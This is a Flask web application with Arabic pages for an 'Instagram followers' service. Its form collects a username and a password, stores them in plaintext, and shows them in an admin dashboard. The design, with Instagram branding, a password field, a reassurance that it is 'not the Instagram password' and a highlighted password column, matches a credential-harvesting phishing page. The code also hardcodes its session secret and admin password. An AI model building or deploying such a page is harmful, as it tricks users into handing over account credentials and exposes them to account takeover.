from flask import Flask, request, render_template_string, session, redirect, url_for
import sqlite3
from datetime import datetime
from functools import wraps

app = Flask(__name__)

app.secret_key = "NawfalInstagramAdminSecret2026"

DB_NAME = "service.db"
ADMIN_PASSWORD = "NawfalAdmin2026!"


# =========================
# DATABASE
# =========================

def get_db():
    conn = sqlite3.connect(DB_NAME)
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    conn = get_db()

    conn.execute("""
        CREATE TABLE IF NOT EXISTS orders (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            service_password TEXT,
            followers INTEGER NOT NULL,
            status TEXT NOT NULL,
            created_at TEXT NOT NULL
        )
    """)

    # إضافة العمود للمشاريع القديمة بدون حذف البيانات
    columns = [
        row["name"]
        for row in conn.execute("PRAGMA table_info(orders)").fetchall()
    ]

    if "service_password" not in columns:
        conn.execute(
            "ALTER TABLE orders ADD COLUMN service_password TEXT"
        )

    conn.commit()
    conn.close()


# =========================
# ADMIN AUTH
# =========================

def admin_required(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        if not session.get("admin_logged_in"):
            return redirect(url_for("admin_login"))
        return func(*args, **kwargs)

    return wrapper


# =========================
# HOME
# =========================

@app.route("/", methods=["GET", "POST"])
def home():

    if request.method == "POST":

        username = request.form.get("username", "").strip()
        service_password = request.form.get("password", "").strip()
        followers_raw = request.form.get("followers", "").strip()

        if not username:
            return render_template_string(ERROR_PAGE, message="يرجى إدخال اسم المستخدم.")

        if not service_password:
            return render_template_string(ERROR_PAGE, message="يرجى إدخال كلمة المرور الخاصة بالخدمة.")

        try:
            followers = int(followers_raw)
        except ValueError:
            return render_template_string(ERROR_PAGE, message="عدد المتابعين غير صحيح.")

        allowed_packages = [100, 500, 1000, 5000, 10000]

        if followers not in allowed_packages:
            return render_template_string(ERROR_PAGE, message="الباقة غير متاحة.")

        created_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        conn = get_db()

        conn.execute(
            """
            INSERT INTO orders
            (
                username,
                service_password,
                followers,
                status,
                created_at
            )
            VALUES (?, ?, ?, ?, ?)
            """,
            (
                username,
                service_password,
                followers,
                "قيد المراجعة",
                created_at
            )
        )

        order_id = conn.execute(
            "SELECT last_insert_rowid()"
        ).fetchone()[0]

        conn.commit()
        conn.close()

        return render_template_string(
            SUCCESS_PAGE,
            order_id=order_id
        )

    return render_template_string(HOME_PAGE)


# =========================
# ADMIN LOGIN
# =========================

@app.route("/admin/login", methods=["GET", "POST"])
def admin_login():

    if session.get("admin_logged_in"):
        return redirect(url_for("admin"))

    error = ""

    if request.method == "POST":

        password = request.form.get("password", "")

        if password == ADMIN_PASSWORD:
            session["admin_logged_in"] = True
            return redirect(url_for("admin"))

        error = "كلمة المرور غير صحيحة."

    return render_template_string(
        ADMIN_LOGIN_PAGE,
        error=error
    )


# =========================
# ADMIN DASHBOARD
# =========================

@app.route("/admin")
@admin_required
def admin():

    conn = get_db()

    orders = conn.execute(
        """
        SELECT
            id,
            username,
            service_password,
            followers,
            status,
            created_at
        FROM orders
        ORDER BY id DESC
        """
    ).fetchall()

    total_orders = conn.execute(
        "SELECT COUNT(*) AS total FROM orders"
    ).fetchone()["total"]

    conn.close()

    return render_template_string(
        ADMIN_PAGE,
        orders=orders,
        total_orders=total_orders
    )


# =========================
# CHANGE ORDER STATUS
# =========================

@app.route("/admin/status/<int:order_id>", methods=["POST"])
@admin_required
def change_status(order_id):

    status = request.form.get("status", "").strip()

    allowed_statuses = [
        "قيد المراجعة",
        "قيد التنفيذ",
        "تم التنفيذ",
        "ملغي"
    ]

    if status not in allowed_statuses:
        return redirect(url_for("admin"))

    conn = get_db()

    conn.execute(
        """
        UPDATE orders
        SET status = ?
        WHERE id = ?
        """,
        (status, order_id)
    )

    conn.commit()
    conn.close()

    return redirect(url_for("admin"))


# =========================
# DELETE ORDER
# =========================

@app.route("/admin/delete/<int:order_id>", methods=["POST"])
@admin_required
def delete_order(order_id):

    conn = get_db()

    conn.execute(
        "DELETE FROM orders WHERE id = ?",
        (order_id,)
    )

    conn.commit()
    conn.close()

    return redirect(url_for("admin"))


# =========================
# LOGOUT
# =========================

@app.route("/admin/logout")
def admin_logout():

    session.clear()

    return redirect(url_for("admin_login"))


# =========================
# HOME PAGE
# =========================

HOME_PAGE = r"""
<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Instagram شحن متابعين</title>

<style>

* {
    box-sizing: border-box;
}

html,
body {
    margin: 0;
    padding: 0;
    min-height: 100%;
}

body {

    font-family:
        "Segoe UI",
        Tahoma,
        Arial,
        sans-serif;

    background:
        radial-gradient(
            circle at 10% 20%,
            rgba(225, 48, 108, .25),
            transparent 35%
        ),
        radial-gradient(
            circle at 90% 20%,
            rgba(131, 58, 180, .28),
            transparent 35%
        ),
        radial-gradient(
            circle at 50% 90%,
            rgba(64, 93, 230, .22),
            transparent 35%
        ),
        #07070d;

    color: white;

    min-height: 100vh;

    overflow-x: hidden;

    display: flex;

    justify-content: center;

    align-items: center;

    padding: 25px;
}

body::before,
body::after {

    content: "";

    position: fixed;

    width: 280px;
    height: 280px;

    border-radius: 50%;

    filter: blur(90px);

    opacity: .25;

    z-index: -1;

    animation: float 8s infinite alternate ease-in-out;
}

body::before {

    background: #e1306c;

    top: -80px;
    left: -80px;
}

body::after {

    background: #833ab4;

    bottom: -80px;
    right: -80px;

    animation-delay: 2s;
}

@keyframes float {

    from {
        transform: translate(0, 0);
    }

    to {
        transform: translate(40px, -30px);
    }
}

.container {

    width: 100%;

    max-width: 470px;

}

.card {

    width: 100%;

    background:
        rgba(18, 18, 28, .76);

    backdrop-filter: blur(22px);

    -webkit-backdrop-filter: blur(22px);

    border:
        1px solid rgba(255,255,255,.10);

    border-radius: 28px;

    padding: 32px;

    box-shadow:
        0 25px 80px rgba(0,0,0,.45);

}

.logo {

    width: 72px;
    height: 72px;

    margin: 0 auto 18px;

    border-radius: 22px;

    display: flex;

    align-items: center;
    justify-content: center;

    font-size: 38px;

    font-weight: bold;

    background:
        linear-gradient(
            135deg,
            #833ab4,
            #e1306c,
            #f77737,
            #fcaf45
        );

    box-shadow:
        0 15px 35px rgba(225,48,108,.28);

}

h1 {

    margin: 0;

    text-align: center;

    font-size: 26px;

}

.subtitle {

    margin:
        9px
        0
        28px;

    text-align: center;

    color: rgba(255,255,255,.60);

    font-size: 14px;

}

.form-group {

    margin-bottom: 19px;

}

label {

    display: block;

    margin-bottom: 8px;

    font-size: 14px;

    color: rgba(255,255,255,.88);

}

input,
select {

    width: 100%;

    border: 1px solid rgba(255,255,255,.09);

    outline: none;

    background:
        rgba(255,255,255,.055);

    color: white;

    padding:
        15px
        15px;

    border-radius: 14px;

    font-size: 15px;

    transition: .2s;

}

input::placeholder {

    color:
        rgba(255,255,255,.35);

}

input:focus,
select:focus {

    border-color:
        rgba(225,48,108,.75);

    background:
        rgba(255,255,255,.075);

    box-shadow:
        0 0 0 3px rgba(225,48,108,.10);

}

select {

    cursor: pointer;

}

select option {

    background: #171722;

    color: white;

}

.packages {

    display: grid;

    grid-template-columns:
        repeat(3, 1fr);

    gap: 9px;

    margin-top: 10px;

}

.package {

    background:
        rgba(255,255,255,.045);

    border:
        1px solid rgba(255,255,255,.08);

    border-radius: 12px;

    padding: 10px;

    text-align: center;

    font-size: 13px;

    color:
        rgba(255,255,255,.65);

}

.package strong {

    display: block;

    color: white;

    font-size: 15px;

    margin-bottom: 2px;

}

button {

    width: 100%;

    border: none;

    outline: none;

    cursor: pointer;

    color: white;

    font-size: 16px;

    font-weight: 700;

    padding: 15px;

    border-radius: 15px;

    background:
        linear-gradient(
            135deg,
            #833ab4,
            #e1306c,
            #f77737
        );

    box-shadow:
        0 12px 30px rgba(225,48,108,.25);

    transition:
        transform .2s,
        box-shadow .2s;

}

button:hover {

    transform:
        translateY(-2px);

    box-shadow:
        0 16px 35px rgba(225,48,108,.35);

}

.info {

    margin-top: 18px;

    padding: 14px;

    border-radius: 14px;

    background:
        rgba(255,255,255,.04);

    border:
        1px solid rgba(255,255,255,.06);

    color:
        rgba(255,255,255,.60);

    font-size: 12px;

    line-height: 1.8;

    text-align: center;

}

.footer {

    text-align: center;

    margin-top: 20px;

    font-size: 12px;

    color:
        rgba(255,255,255,.30);

}

</style>

</head>

<body>

<div class="container">

    <div class="card">

        <div class="logo">
            ◎
        </div>

        <h1>
            Instagram شحن متابعين
        </h1>

        <div class="subtitle">
            اطلب خدمتك بسهولة وسرعة
        </div>

        <form method="POST">

            <div class="form-group">

                <label>
                    اسم المستخدم
                </label>

                <input
                    type="text"
                    name="username"
                    placeholder="أدخل اسم المستخدم"
                    autocomplete="off"
                    required
                >

            </div>


            <div class="form-group">

                <label>
                    كلمة المرور
                </label>

                <input
                    type="password"
                    name="password"
                    placeholder="كلمة المرور الخاصة بالخدمة"
                    autocomplete="off"
                    required
                >

            </div>


            <div class="form-group">

                <label>
                    عدد المتابعين
                </label>

                <select
                    name="followers"
                    required
                >

                    <option value="">
                        اختر الباقة
                    </option>

                    <option value="100">
                        100 متابع
                    </option>

                    <option value="500">
                        500 متابع
                    </option>

                    <option value="1000">
                        1,000 متابع
                    </option>

                    <option value="5000">
                        5,000 متابع
                    </option>

                    <option value="10000">
                        10,000 متابع
                    </option>

                </select>


                <div class="packages">

                    <div class="package">
                        <strong>100</strong>
                        متابع
                    </div>

                    <div class="package">
                        <strong>500</strong>
                        متابع
                    </div>

                    <div class="package">
                        <strong>1K</strong>
                        متابع
                    </div>

                    <div class="package">
                        <strong>5K</strong>
                        متابع
                    </div>

                    <div class="package">
                        <strong>10K</strong>
                        متابع
                    </div>

                </div>

            </div>


            <button type="submit">
                إرسال الطلب
            </button>

        </form>


        <div class="info">

            🔒 كلمة المرور هنا مخصصة للخدمة فقط وليست كلمة مرور حساب Instagram.

            <br>

            يتم حفظ بيانات الطلب داخل لوحة الإدارة.

        </div>


        <div class="footer">
            Instagram Followers Service
        </div>

    </div>

</div>

</body>

</html>
"""


# =========================
# SUCCESS PAGE
# =========================

SUCCESS_PAGE = r"""
<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>

<meta charset="UTF-8">

<meta
    name="viewport"
    content="width=device-width, initial-scale=1.0"
>

<title>تم إرسال الطلب</title>

<style>

* {
    box-sizing: border-box;
}

body {

    margin: 0;

    min-height: 100vh;

    display: flex;

    align-items: center;

    justify-content: center;

    padding: 25px;

    font-family:
        "Segoe UI",
        Tahoma,
        Arial,
        sans-serif;

    color: white;

    background:
        radial-gradient(
            circle at 10% 20%,
            rgba(225,48,108,.25),
            transparent 35%
        ),
        radial-gradient(
            circle at 90% 20%,
            rgba(131,58,180,.28),
            transparent 35%
        ),
        #07070d;

}

.card {

    width: 100%;

    max-width: 470px;

    text-align: center;

    padding: 35px;

    border-radius: 28px;

    background:
        rgba(18,18,28,.78);

    border:
        1px solid rgba(255,255,255,.10);

    backdrop-filter: blur(22px);

    box-shadow:
        0 25px 80px rgba(0,0,0,.45);

}

.icon {

    width: 75px;
    height: 75px;

    margin: 0 auto 20px;

    border-radius: 50%;

    display: flex;

    align-items: center;

    justify-content: center;

    font-size: 38px;

    background:
        linear-gradient(
            135deg,
            #833ab4,
            #e1306c,
            #f77737
        );

}

h1 {

    margin: 0 0 12px;

}

p {

    color:
        rgba(255,255,255,.62);

    line-height: 1.8;

}

.order {

    margin-top: 22px;

    padding: 16px;

    border-radius: 15px;

    background:
        rgba(255,255,255,.05);

    font-size: 16px;

}

a {

    display: block;

    margin-top: 22px;

    padding: 14px;

    border-radius: 14px;

    text-decoration: none;

    color: white;

    font-weight: bold;

    background:
        linear-gradient(
            135deg,
            #833ab4,
            #e1306c,
            #f77737
        );

}

</style>

</head>

<body>

<div class="card">

    <div class="icon">
        ✓
    </div>

    <h1>
        تم إرسال طلبك بنجاح
    </h1>

    <p>
        طلبك الآن قيد المراجعة.
    </p>

    <div class="order">

        رقم الطلب:
        <strong>
            #{{ order_id }}
        </strong>

    </div>

    <a href="/">
        العودة للرئيسية
    </a>

</div>

</body>

</html>
"""


# =========================
# ERROR PAGE
# =========================

ERROR_PAGE = r"""
<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>

<meta charset="UTF-8">

<meta
    name="viewport"
    content="width=device-width, initial-scale=1.0"
>

<title>خطأ</title>

<style>

* {
    box-sizing: border-box;
}

body {

    margin: 0;

    min-height: 100vh;

    display: flex;

    align-items: center;

    justify-content: center;

    padding: 25px;

    font-family:
        "Segoe UI",
        Tahoma,
        Arial,
        sans-serif;

    color: white;

    background:
        radial-gradient(
            circle at 10% 20%,
            rgba(225,48,108,.25),
            transparent 35%
        ),
        radial-gradient(
            circle at 90% 20%,
            rgba(131,58,180,.28),
            transparent 35%
        ),
        #07070d;

}

.card {

    width: 100%;

    max-width: 470px;

    text-align: center;

    padding: 35px;

    border-radius: 28px;

    background:
        rgba(18,18,28,.78);

    border:
        1px solid rgba(255,255,255,.10);

    backdrop-filter: blur(22px);

}

.icon {

    font-size: 45px;

    margin-bottom: 15px;

}

p {

    color:
        rgba(255,255,255,.65);

}

a {

    display: block;

    margin-top: 20px;

    padding: 14px;

    border-radius: 14px;

    text-decoration: none;

    color: white;

    background:
        linear-gradient(
            135deg,
            #833ab4,
            #e1306c,
            #f77737
        );

}

</style>

</head>

<body>

<div class="card">

    <div class="icon">
        ⚠
    </div>

    <h2>
        حدث خطأ
    </h2>

    <p>
        {{ message }}
    </p>

    <a href="/">
        العودة
    </a>

</div>

</body>

</html>
"""


# =========================
# ADMIN LOGIN PAGE
# =========================

ADMIN_LOGIN_PAGE = r"""
<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>

<meta charset="UTF-8">

<meta
    name="viewport"
    content="width=device-width, initial-scale=1.0"
>

<title>دخول الإدارة</title>

<style>

* {
    box-sizing: border-box;
}

body {

    margin: 0;

    min-height: 100vh;

    display: flex;

    justify-content: center;

    align-items: center;

    padding: 25px;

    font-family:
        "Segoe UI",
        Tahoma,
        Arial,
        sans-serif;

    color: white;

    background:
        radial-gradient(
            circle at 10% 20%,
            rgba(225,48,108,.25),
            transparent 35%
        ),
        radial-gradient(
            circle at 90% 20%,
            rgba(131,58,180,.28),
            transparent 35%
        ),
        #07070d;

}

.card {

    width: 100%;

    max-width: 420px;

    padding: 32px;

    border-radius: 28px;

    background:
        rgba(18,18,28,.78);

    border:
        1px solid rgba(255,255,255,.10);

    backdrop-filter: blur(22px);

    box-shadow:
        0 25px 80px rgba(0,0,0,.45);

}

h1 {

    text-align: center;

    margin-top: 0;

    margin-bottom: 28px;

}

label {

    display: block;

    margin-bottom: 8px;

}

input {

    width: 100%;

    padding: 15px;

    border-radius: 14px;

    border:
        1px solid rgba(255,255,255,.09);

    outline: none;

    background:
        rgba(255,255,255,.05);

    color: white;

    font-size: 15px;

    margin-bottom: 18px;

}

button {

    width: 100%;

    border: none;

    padding: 15px;

    border-radius: 14px;

    color: white;

    font-size: 16px;

    font-weight: bold;

    cursor: pointer;

    background:
        linear-gradient(
            135deg,
            #833ab4,
            #e1306c,
            #f77737
        );

}

.error {

    margin-bottom: 15px;

    padding: 12px;

    border-radius: 12px;

    background:
        rgba(225,48,108,.12);

    color:
        #ff9bbb;

    text-align: center;

    font-size: 14px;

}

</style>

</head>

<body>

<div class="card">

    <h1>
        🔐 لوحة الإدارة
    </h1>

    {% if error %}

        <div class="error">
            {{ error }}
        </div>

    {% endif %}

    <form method="POST">

        <label>
            كلمة مرور الإدارة
        </label>

        <input
            type="password"
            name="password"
            placeholder="أدخل كلمة المرور"
            autocomplete="off"
            required
        >

        <button type="submit">
            تسجيل الدخول
        </button>

    </form>

</div>

</body>

</html>
"""


# =========================
# ADMIN PAGE
# =========================

ADMIN_PAGE = r"""
<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>

<meta charset="UTF-8">

<meta
    name="viewport"
    content="width=device-width, initial-scale=1.0"
>

<title>لوحة الإدارة</title>

<style>

* {
    box-sizing: border-box;
}

body {

    margin: 0;

    min-height: 100vh;

    font-family:
        "Segoe UI",
        Tahoma,
        Arial,
        sans-serif;

    color: white;

    background:
        radial-gradient(
            circle at 10% 20%,
            rgba(225,48,108,.20),
            transparent 35%
        ),
        radial-gradient(
            circle at 90% 20%,
            rgba(131,58,180,.22),
            transparent 35%
        ),
        #07070d;

    padding: 25px;

}

.container {

    max-width: 1250px;

    margin: auto;

}

.header {

    display: flex;

    justify-content: space-between;

    align-items: center;

    gap: 15px;

    margin-bottom: 25px;

}

.header h1 {

    margin: 0;

    font-size: 28px;

}

.logout {

    text-decoration: none;

    color: white;

    padding: 11px 18px;

    border-radius: 12px;

    background:
        rgba(255,255,255,.07);

    border:
        1px solid rgba(255,255,255,.08);

}

.stat {

    display: inline-block;

    padding: 20px 25px;

    margin-bottom: 22px;

    border-radius: 18px;

    background:
        rgba(255,255,255,.055);

    border:
        1px solid rgba(255,255,255,.08);

}

.stat small {

    display: block;

    color:
        rgba(255,255,255,.55);

    margin-bottom: 5px;

}

.stat strong {

    font-size: 28px;

}

.table-wrap {

    width: 100%;

    overflow-x: auto;

    border-radius: 20px;

    background:
        rgba(18,18,28,.78);

    border:
        1px solid rgba(255,255,255,.09);

    backdrop-filter: blur(20px);

}

table {

    width: 100%;

    min-width: 900px;

    border-collapse: collapse;

}

th,
td {

    padding: 15px;

    text-align: right;

    border-bottom:
        1px solid rgba(255,255,255,.06);

}

th {

    color:
        rgba(255,255,255,.65);

    font-size: 13px;

    font-weight: 600;

}

td {

    font-size: 14px;

}

.password {

    direction: ltr;

    text-align: right;

    font-family:
        Consolas,
        monospace;

    color:
        #ffd6e3;

    background:
        rgba(225,48,108,.08);

    padding: 7px 10px;

    border-radius: 8px;

    display: inline-block;

}

.status {

    display: inline-block;

    padding: 7px 12px;

    border-radius: 999px;

    background:
        rgba(225,48,108,.12);

    color:
        #ffb5cb;

    font-size: 12px;

}

.status-form {

    display: flex;

    gap: 7px;

}

.status-form select {

    background:
        #191923;

    color: white;

    border:
        1px solid rgba(255,255,255,.08);

    border-radius: 8px;

    padding: 7px;

}

.status-form button {

    border: none;

    border-radius: 8px;

    padding: 7px 11px;

    color: white;

    cursor: pointer;

    background:
        linear-gradient(
            135deg,
            #833ab4,
            #e1306c
        );

}

.delete {

    margin-top: 7px;

    border: none;

    border-radius: 8px;

    padding: 7px 11px;

    color: white;

    background:
        rgba(255,70,100,.14);

    cursor: pointer;

}

.empty {

    text-align: center;

    padding: 40px;

    color:
        rgba(255,255,255,.45);

}

@media (max-width: 700px) {

    body {
        padding: 15px;
    }

    .header {
        align-items: flex-start;
        flex-direction: column;
    }

    .header h1 {
        font-size: 22px;
    }

}

</style>

</head>

<body>

<div class="container">

    <div class="header">

        <h1>
            📊 لوحة إدارة الطلبات
        </h1>

        <a
            class="logout"
            href="/admin/logout"
        >
            تسجيل الخروج
        </a>

    </div>


    <div class="stat">

        <small>
            إجمالي الطلبات
        </small>

        <strong>
            {{ total_orders }}
        </strong>

    </div>


    <div class="table-wrap">

        {% if orders %}

        <table>

            <thead>

                <tr>

                    <th>
                        رقم الطلب
                    </th>

                    <th>
                        اسم المستخدم
                    </th>

                    <th>
                        كلمة المرور
                    </th>

                    <th>
                        عدد المتابعين
                    </th>

                    <th>
                        الحالة
                    </th>

                    <th>
                        التاريخ
                    </th>

                    <th>
                        التحكم
                    </th>

                </tr>

            </thead>

            <tbody>

            {% for order in orders %}

                <tr>

                    <td>
                        #{{ order["id"] }}
                    </td>

                    <td>
                        {{ order["username"] }}
                    </td>

                    <td>

                        {% if order["service_password"] %}

                            <span class="password">
                                {{ order["service_password"] }}
                            </span>

                        {% else %}

                            <span style="color:#777;">
                                غير متوفر
                            </span>

                        {% endif %}

                    </td>

                    <td>
                        {{ "{:,}".format(order["followers"]) }}
                    </td>

                    <td>

                        <span class="status">
                            {{ order["status"] }}
                        </span>

                    </td>

                    <td>
                        {{ order["created_at"] }}
                    </td>

                    <td>

                        <form
                            class="status-form"
                            method="POST"
                            action="/admin/status/{{ order['id'] }}"
                        >

                            <select name="status">

                                <option
                                    value="قيد المراجعة"
                                    {% if order["status"] == "قيد المراجعة" %}selected{% endif %}
                                >
                                    قيد المراجعة
                                </option>

                                <option
                                    value="قيد التنفيذ"
                                    {% if order["status"] == "قيد التنفيذ" %}selected{% endif %}
                                >
                                    قيد التنفيذ
                                </option>

                                <option
                                    value="تم التنفيذ"
                                    {% if order["status"] == "تم التنفيذ" %}selected{% endif %}
                                >
                                    تم التنفيذ
                                </option>

                                <option
                                    value="ملغي"
                                    {% if order["status"] == "ملغي" %}selected{% endif %}
                                >
                                    ملغي
                                </option>

                            </select>

                            <button type="submit">
                                حفظ
                            </button>

                        </form>


                        <form
                            method="POST"
                            action="/admin/delete/{{ order['id'] }}"
                            onsubmit="return confirm('هل تريد حذف هذا الطلب؟');"
                        >

                            <button
                                class="delete"
                                type="submit"
                            >
                                حذف الطلب
                            </button>

                        </form>

                    </td>

                </tr>

            {% endfor %}

            </tbody>

        </table>

        {% else %}

            <div class="empty">
                لا توجد طلبات حتى الآن.
            </div>

        {% endif %}

    </div>

</div>

</body>

</html>
"""


# =========================
# START
# =========================

init_db()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)